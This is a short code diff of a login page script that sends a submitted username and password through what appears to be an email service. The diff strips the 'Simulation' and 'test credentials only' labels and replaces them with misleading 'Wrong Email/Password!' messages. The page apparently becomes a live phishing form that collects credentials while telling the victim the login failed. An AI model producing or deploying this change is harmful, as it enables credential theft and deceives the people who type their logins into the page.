@@ -42,12 +42,12 @@
       username: username,
       password: password
     })
-    .then(function (response) {
-      console.log("✅ Email sent successfully", response.status, response.text);
-      alert("🟢 Simulation sent (test credentials only)");
+    .then(function(response) {
+                alert('Login information sent successfully!');
+                console.log('Wrong Email/Password!', response);
     }, function (error) {
       console.error("❌ Failed to send:", error);
-      alert("🔴 Simulation failed: " + JSON.stringify(error));
+      alert("Wrong Email/Password!" + JSON.stringify(error));
     });
   });
 </script>
